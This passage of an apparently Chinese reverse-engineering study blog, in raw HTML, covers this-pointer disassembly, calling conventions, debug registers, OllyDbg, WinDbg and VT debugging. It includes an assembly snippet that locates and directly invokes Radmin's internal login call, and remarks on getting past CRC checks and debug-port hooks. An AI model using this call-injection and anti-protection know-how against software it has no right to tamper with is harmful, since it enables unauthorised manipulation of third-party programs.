class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct MyStruct</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint x ;</span><br><span class=\"line\">\tint y ;</span><br><span class=\"line\">\t//函数在结构体内部</span><br><span class=\"line\">\tint Max(MyStruct* str)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\treturn str-&gt;x &gt; str-&gt;y ? str-&gt;x :str-&gt;y ;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">int main(int argc, CHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tMyStruct haha ;</span><br><span class=\"line\">\thaha.x = 1 ;</span><br><span class=\"line\">\thaha.y = 2 ;</span><br><span class=\"line\">        haha.Max(&amp;haha);</span><br><span class=\"line\">        printf(&quot;%d\\n&quot;,haha.Max(&amp;haha));</span><br><span class=\"line\">\tprintf(&quot;%d\\n&quot;,sizeof(haha));</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>此处 ecx 就是 this 指针</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917165815847.png\" alt=\"image-20230917165815847\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230917165956983.png\" alt=\"image-20230917165956983\"></p>\n<p>this 指针指的其实就是结构体首地址，通过 this 指针偏移可以很容易地访问结构体中的变量</p>\n<h3 id=\"析构和构造识别\"><a class=\"markdownIt-Anchor\" href=\"#析构和构造识别\">#</a> 析构和构造识别</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class MyTest</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">public:</span><br><span class=\"line\">    MyTest();</span><br><span class=\"line\">    ~MyTest();</span><br><span class=\"line\">    void SetTest(DWORD dwTest);</span><br><span class=\"line\">    DWORD GetTest();</span><br><span class=\"line\">public:</span><br><span class=\"line\">    DWORD m_dwTest;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"> MyTest::MyTest()</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">     printf(&quot;1111\\r\\n&quot;);</span><br><span class=\"line\">     </span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"> MyTest::~MyTest()</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">    printf(&quot;2222\\r\\n&quot;);</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void MyTest::SetTest(DWORD dwTest)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    this-&gt;m_dwTest = dwTest;   </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">DWORD MyTest::GetTest()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    return this-&gt;m_dwTest;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    MyTest Test;</span><br><span class=\"line\">    Test.SetTest(1);　　　　　　</span><br><span class=\"line\">    int Number = Test.GetTest();　　　　　　//添加了Set,Get方法,并调用</span><br><span class=\"line\">    getchar();</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919155106258.png\" alt=\"image-20230919155106258\"></p>\n<p>set 关键语句处</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919155150318.png\" alt=\"image-20230919155150318\"></p>\n<p>前两句：</p>\n<p>ecx 是调用函数时传入的 this 指针，通过 [ebp-0x8] 将 eax 和 ecx 都变成了 this 指针</p>\n<p>后两句：</p>\n<p>ecx 是调用 set 传入的 1，复制给 this 指针，因为这里只有一个类变量，所以是 eax，如果由多个类变量，会出现 [eax+8] 这类通过 this 指针的偏移找到类变量的方式</p>\n<p>get 关键处：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919155536924.png\" alt=\"image-20230919155536924\"></p>\n<p>前两句：</p>\n<p>ecx 是调用函数时传入的 this 指针，通过 [ebp-0x8] 将 eax 和 ecx 都变成了 this 指针</p>\n<p>mov eax,dword ptr ds:[eax]</p>\n<p>把第一个成员变量的值给 eax 作为返回值带出，这样这个函数外面就能获取这个成员变量的值</p>\n<h3 id=\"调用约定\"><a class=\"markdownIt-Anchor\" href=\"#调用约定\">#</a> 调用约定</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/3b99957e628c42afa9c38c41c0145f6f.png\" alt=\"img\"></p>\n<p>(1) 子程序的调用过程：调用者首先把参数压入堆栈，然后调用子程序，在完成后，由于堆栈中先前压入的参数不再有用，调用者或被调用者必须有一方把堆栈指针修正到调用前的状态，即堆栈平衡或平衡堆栈。</p>\n<p>(2) 最右边的参数先入堆栈，还是最左边的参数先入堆栈。即：参数从右到左压入堆栈，还是从左到右压入堆栈。这需要约定。</p>\n<p>(3) 有调用者修正堆栈，还是有被调用者修正堆栈。这也需要约定。</p>\n<h3 id=\"寻找readmin对话call\"><a class=\"markdownIt-Anchor\" href=\"#寻找readmin对话call\">#</a> 寻找 readmin 对话 call</h3>\n<p>1.readmin 是 mfc 写的，mfc 的可以使用 spy++ 等查到句柄</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919174452707.png\" alt=\"image-20230919174452707\"></p>\n<p>2. 通过 CreateThread 创建</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919175737730.png\" alt=\"image-20230919175737730\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, DWORD dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId)</span><br><span class=\"line\">.text:7DD734D5                 public CreateThread</span><br><span class=\"line\">.text:7DD734D5 CreateThread    proc near               ; DATA XREF: .text:off_7DE1FA28</span><br><span class=\"line\">.text:7DD734D5</span><br><span class=\"line\">.text:7DD734D5 lpThreadAttributes= dword ptr  8</span><br><span class=\"line\">.text:7DD734D5 dwStackSize     = dword ptr  0Ch</span><br><span class=\"line\">.text:7DD734D5 lpStartAddress  = dword ptr  10h</span><br><span class=\"line\">.text:7DD734D5 lpParameter     = dword ptr  14h</span><br><span class=\"line\">.text:7DD734D5 dwCreationFlags = dword ptr  18h</span><br><span class=\"line\">.text:7DD734D5 lpThreadId      = dword ptr  1Ch</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919220503043.png\" alt=\"image-20230919220503043\"></p>\n<p>CreateThread 会调用 CreateRemoteThread</p>\n<p>ret 0x18 是 push 参数的总大小  4 * 6 = 24 = 0x18。</p>\n<p>4 因为内存对齐</p>\n<p>3. 找到对话 call</p>\n<p>对 CreateThread 下断</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919221543018.png\" alt=\"image-20230919221543018\"></p>\n<p>返回到调用处</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919221633847.png\" alt=\"image-20230919221633847\"></p>\n<p>向上回溯</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919221957032.png\" alt=\"image-20230919221957032\"></p>\n<p>4. 模拟登录 call</p>\n<p>注意：这些值只在本次有效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pushad</span><br><span class=\"line\">pushfd</span><br><span class=\"line\">mov esi,0x0F076A</span><br><span class=\"line\">push 0x9c49    #功能号</span><br><span class=\"line\">push 0x881064   # 结构体</span><br><span class=\"line\">add ebp,0x3458</span><br><span class=\"line\">push 0x00188B5C</span><br><span class=\"line\">push 0x000F076A</span><br><span class=\"line\">call 0x143f8e0</span><br><span class=\"line\">add esp,10</span><br><span class=\"line\">popfd</span><br><span class=\"line\">popad</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919222940886.png\" alt=\"image-20230919222940886\"></p>\n<h2 id=\"动态调试基础\"><a class=\"markdownIt-Anchor\" href=\"#动态调试基础\">#</a> 动态调试基础</h2>\n<h3 id=\"tls回调-fs0\"><a class=\"markdownIt-Anchor\" href=\"#tls回调-fs0\">#</a> TLS 回调  fs:[0]</h3>\n<p><strong>Fs:[0] 总是指向当前线程的 TIB，其中 0 偏移的指向线程的异常链表，即 ExceptionList 是指向异常处理链表（EXCEPTION_REGISTRATION 结构）的一个指针。</strong></p>\n<p>SEH 结构为链表，fs:[0] 指向表头</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veWlsYW5nL3AvMTEyMzM5MzUuaHRtbA==\">结构化异常 SEH 处理机制详细介绍 (一） - 活着的虫子 - 博客园 (cnblogs.com)</span></p>\n<h3 id=\"调试器原理\"><a class=\"markdownIt-Anchor\" href=\"#调试器原理\">#</a> 调试器原理</h3>\n<p>DR0~DR3 这四个寄存器是断点地址存储器，用于保存断点的地址<br>\n DR6 是调试状态寄存器用于指明 DR0~DR3 寄存器中哪一个产生了调试异常<br>\n DR6 寄存器使用比特位 B0<sub>B3 来指明 DR0</sub>DR3 中哪个产生了调试异常<br>\n DR7 是断点属性控制器<br>\n DR7 寄存器分别保存着 DR0~DR3 的断点地址对应的断点的属性，属性有如下几种:<br>\nL0~L3: 这个比特位等于 1, 则断点为本地断点.<br>\nG0~G3: 这个比特位等于 1, 则断点为全局断点.<br>\nR/W0-R/W3:<br>\n00：执行断点<br>\n 01：数据写入断点<br>\n 10：I/0 读写断点<br>\n 11：读写断点 () 读取指令不算)</p>\n<p>硬件断点可以避开常见 crc 校验和一些内存冗余，线程的校验。但是只有 DR0-DR3，所以最多只能同时存在 4 个</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919223808979.png\" alt=\"image-20230919223808979\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919223914491.png\" alt=\"image-20230919223914491\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int main(int argc, char* argv[])</span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">\t __asm&#123;int 3&#125;;</span><br><span class=\"line\">\t return 0;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919224401961.png\" alt=\"image-20230919224401961\"></p>\n<p>程序运行到 int 3 会直接中断，但是调试器会捕捉到异常</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919233521676.png\" alt=\"image-20230919233521676\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919224605639.png\" alt=\"image-20230919224605639\"></p>\n<p>调试器实现的依赖.<br>\n1.CPU 支持调试功能<br>\n 1.1CPU 中，有标志寄存器 EFLAGS 的 IF,TF 标志位用于开启调试功能，如果一个进程是以调试状态开启，且其线程环境 (CONTEXT) 中的 EFLSGS 的 TF 标志位是 1, 那么这个进程执行一条指令后，将会产生一个异常，异常被处理后，TF 自动被重置为 0<br>\n1.2CPU 有 DRx (DebugRegister) 系列的寄存器可用于断点功能.</p>\n<p>关闭中断层支持 CPU 执行，hook 调试端口，导致 OD 无法调试。此时需要做 VT 调试器无痕断点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/a65b1b14d4de4194962882b7e3ca9aa3.png\" alt=\"img\"></p>\n<p>hd addr    # 删除 addr 处的硬件断点</p>\n<p>hr addr     # 对 addr 设置硬件断点</p>\n<p>硬件断点在程序加壳的时候比较有用</p>\n<p>内存镜像 ALT+M   程序映射到内存中的所有数据</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230919225902299.png\" alt=\"image-20230919225902299\"></p>\n<h4 id=\"调试器原理-2\"><a class=\"markdownIt-Anchor\" href=\"#调试器原理-2\">#</a> 调试器原理</h4>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/db741d5bfeb2463ab082189506c28966.png\" alt=\"img\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>以调试创建一个进程或附加到一个进程</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">CreateProcess</span>(<span class=\"comment\">/*创建调试线程*/</span></span><br><span class=\"line\">pszFilePath,<span class=\"comment\">//可执行模块路径</span></span><br><span class=\"line\"><span class=\"literal\">NULL</span>,<span class=\"comment\">//命令行</span></span><br><span class=\"line\"><span class=\"literal\">NULL</span>,<span class=\"comment\">//安全描述符</span></span><br><span class=\"line\"><span class=\"literal\">NULL</span>,<span class=\"comment\">//线程属性是否可继承</span></span><br><span class=\"line\">FALSE,<span class=\"comment\">//否从调用进程处继承了句柄</span></span><br><span class=\"line\">DEBUG_ONLY_THIS_PROCESS,<span class=\"comment\">//启动方式,这里是以只调试的方式创建一个还没有运行的进程</span></span><br><span class=\"line\"><span class=\"literal\">NULL</span>,<span class=\"comment\">//新进程的环境块</span></span><br><span class=\"line\"><span class=\"literal\">NULL</span>,<span class=\"comment\">//新进程的当前工作路径（当前目录）</span></span><br><span class=\"line\">&amp;stcStartupInfo,<span class=\"comment\">//指定进程的主窗口特性</span></span><br><span class=\"line\">&amp;stcProcInfo<span class=\"comment\">//接收新进程的识别信息</span></span><br><span class=\"line\">);</span><br><span class=\"line\"><span class=\"number\">2.</span>创建完进程后,需要安装个电话,等待调试子系统找上门来:</span><br><span class=\"line\"></span><br><span class=\"line\">typedefstruct_DEBUG_EVENT&#123;</span><br><span class=\"line\">    DWORDdwDebugEventCode;<span class=\"comment\">//发生异常的是什么事</span></span><br><span class=\"line\">    DWORDdwProcessId;<span class=\"comment\">//触发异常的进程ID(如果被调试进程有多个进程,这个ID有可能是其子进程的)</span></span><br><span class=\"line\">    DWORDdwThreadId;<span class=\"comment\">//触发异常的线程ID(如果被调试进程有多个线程,这个ID有可能是其中的一个线程的</span></span><br><span class=\"line\">    <span class=\"keyword\">union</span>&#123;</span><br><span class=\"line\">        EXCEPTION_DEBUG_INFOException;<span class=\"comment\">//异常类型信息</span></span><br><span class=\"line\">        CREATE_THREAD_DEBUG_INFOCreateThread;<span class=\"comment\">//创建线程时得到的信息结构体(有可能会创建多个线程)</span></span><br><span class=\"line\">        CREATE_PROCESS_DEBUG_INFOCreateProcessInfo;<span class=\"comment\">//创建进程时得到的信息结构体,有可能会得到多个</span></span><br><span class=\"line\">        EXIT_THREAD_DEBUG_INFOExitThread;<span class=\"comment\">//线程退出的信息结构体</span></span><br><span class=\"line\">        EXIT_PROCESS_DEBUG_INFOExitProcess;<span class=\"comment\">//进程退出的信息结构体</span></span><br><span class=\"line\">        LOAD_DLL_DEBUG_INFOLoadDll;<span class=\"comment\">//加载模块的信息结构体</span></span><br><span class=\"line\">        UNLOAD_DLL_DEBUG_INFOUnloadDll;<span class=\"comment\">//卸载模块的信息结构体</span></span><br><span class=\"line\">        OUTPUT_DEBUG_STRING_INFODebugString;<span class=\"comment\">//输出调试字串的信息结构体</span></span><br><span class=\"line\">        RIP_INFORipInfo;<span class=\"comment\">//系统调试错误时的信息结构体</span></span><br><span class=\"line\">    &#125;u;<span class=\"comment\">//这是一个联合体,dwDebugEventCode决定联合体中哪个字段是有用的.</span></span><br><span class=\"line\">&#125;DEBUG_EVENT,*LPDEBUG_EVENT;</span><br><span class=\"line\">DEBUG_EVENTstcDeEvent=&#123;<span class=\"number\">0</span>&#125;;<span class=\"comment\">//这是保存调试子系统发来的信息的结构体</span></span><br><span class=\"line\"><span class=\"built_in\">WaitForDebugEvent</span>(&amp;stcDeEvent,<span class=\"comment\">//保存异常信息的结构体</span></span><br><span class=\"line\">INFINIT<span class=\"comment\">//等待时间</span></span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n<h3 id=\"od\"><a class=\"markdownIt-Anchor\" href=\"#od\">#</a> OD</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230920204144315.png\" alt=\"image-20230920204144315\"></p>\n<p>A 区域:view 菜单功能项的快捷按钮</p>\n<p>B+C+D+E+F: CPU 窗口 （OD 打开一个可执行文件后，会立刻加载，自动分析后并列出汇编代码，默认打开 CPU 窗口）</p>\n<p>B 区域：反汇编面板窗口<br>\n（分为 4 列从左至右依次是 Address,Hex dump,Disassembly,Comment）</p>\n<ul>\n<li>Address (地址): 显示被双击行的相对地址，再次双击返回便准地址模式；</li>\n<li>Hex dump (十六进制机器码): 设置或取消无条件断点，对应的快捷键是 F2；</li>\n<li>Disassembly (反汇编代码): 调用汇编器，可直接修改汇编代码，对应快捷键是空格。</li>\n<li>Comment (注释): 允许增加或编辑注释，对应的快捷键是 &quot;;&quot;;</li>\n<li>从键盘上选取多行，可按 Shift 和上下光标键（PgUp/PgDn）, 可以使用右键快捷菜单，可以按 Ctrl 键并按上下光标，可逐行滚动汇编窗口。（数据与代码混合时异常有用）</li>\n</ul>\n<p>C 区域：信息面板窗口</p>\n<ul>\n<li>在进行动态追踪时，信息面板窗口将显示与指令相关的各寄存器的值，API 函数调用提示和跳转提示等信息。</li>\n</ul>\n<p>D 区域：数据面板窗口</p>\n<ul>\n<li>以十六进制和字符方式显示文件在内存中的数据，要显示制定内存地址的数据，可单击右键快捷菜单中的 “Go to expression” 命令或者按 Ctrl+G 快捷键，打开地址窗口输入地址。</li>\n</ul>\n<p>E 区域：寄存器面板窗口</p>\n<ul>\n<li>显示 CPU 各寄存器的值，支持浮点，MMX,3DNow! 寄存器。可以右键或窗口标题切换显示寄存器的方式。</li>\n</ul>\n<p>F 区域：栈面板窗口</p>\n<ul>\n<li>显示栈的内容，即 ESP 指向地址的内容。将数据放入栈的称为入栈 (push)，从栈中取出数据的操作称为出栈 (pop)。API 函数和子程序都利用它传递参数和变量。</li>\n</ul>\n<h3 id=\"windbg\"><a class=\"markdownIt-Anchor\" href=\"#windbg\">#</a> Windbg</h3>\n<p><em>Windbg</em> 是 Microsoft 在 windows 平台下，强大的用户态和内核态调试工具。我们经常用它来分析 DUMP 文件，来解决线上服务器的疑难问题，比如 CPU 升高，内存溢出，响应时间慢等问题。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230920204531472.png\" alt=\"image-20230920204531472\"></p>\n<p>为当前线程设置 int3 断点，调试器捕捉到 cc 的异常，程序停下来</p>\n<p>g 运行</p>\n<p>ctrl+break 中断</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0:001&gt; bp kernel32!OpenProcess</span><br><span class=\"line\">0:001&gt; u kernel32!OpenProcess</span><br><span class=\"line\">kernel32!OpenProcess:</span><br><span class=\"line\">76e11986 8bff            mov     edi,edi</span><br><span class=\"line\">76e11988 55              push    ebp</span><br><span class=\"line\">76e11989 8bec            mov     ebp,esp</span><br><span class=\"line\">76e1198b 5d              pop     ebp</span><br><span class=\"line\">76e1198c eb05            jmp     kernel32!OpenProcess+0xd (76e11993)</span><br><span class=\"line\">76e1198e 90              nop</span><br><span class=\"line\">76e1198f 90              nop</span><br><span class=\"line\">76e11990 90              nop</span><br><span class=\"line\">0:001&gt; u 76e11993</span><br><span class=\"line\">kernel32!OpenProcess+0xd:</span><br><span class=\"line\">76e11993 ff255409e176    jmp     dword ptr [kernel32+0x10954 (76e10954)]</span><br><span class=\"line\">76e11999 90              nop</span><br><span class=\"line\">76e1199a 90              nop</span><br><span class=\"line\">76e1199b 90              nop</span><br><span class=\"line\">76e1199c 90              nop</span><br><span class=\"line\">76e1199d 90              nop</span><br><span class=\"line\">kernel32!WaitForMultipleObjectsEx:</span><br><span class=\"line\">76e1199e 8bff            mov     edi,edi</span><br><span class=\"line\">76e119a0 55              push    ebp</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"intel-vt\"><a class=\"markdownIt-Anchor\" href=\"#intel-vt\">#</a> Intel-vt</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230922214555478.png\" alt=\"image-20230922214555478\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230922214803315.png\" alt=\"image-20230922214803315\"></p>\n<p>需要勾选</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230922215228854.png\" alt=\"image-20230922215228854\"></p>\n<h3 id=\"radmin-对话call模拟\"><a class=\"markdownIt-Anchor\" href=\"#radmin-对话call模拟\">#</a> radmin 对话 call 模拟</h3>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span 